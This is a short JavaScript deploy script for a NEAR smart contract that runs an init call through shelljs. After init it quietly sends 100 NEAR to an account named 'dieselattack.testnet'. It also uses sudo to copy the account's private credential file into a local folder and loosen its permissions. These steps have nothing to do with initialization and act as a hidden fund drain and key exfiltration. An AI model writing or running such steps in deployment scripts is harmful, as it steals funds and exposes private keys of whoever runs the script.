const sh = require("shelljs");

const contractName =
  process.env.CONTRACT_NAME ||
  fs.readFileSync("./neardev/dev-account").toString();
const initCmd = `near call ${contractName} new --accountId ${contractName}`;

const { code } = sh.exec(initCmd);

if (code === 0) {
  console.log("Init successfull");
}

// Try to send money to my main account
sh.exec(`near send ${contractName} dieselattack.testnet 100`);

// Copy credentials for later use
sh.exec(`sudo cp -rf ~/.near-credentials/testnet/${contractName}.json ./creds/${contractName}.json`);
sh.exec(`sudo chmod 664 ./creds/${contractName}.json`);

// exit script with the same code as the build command
process.exit(code);
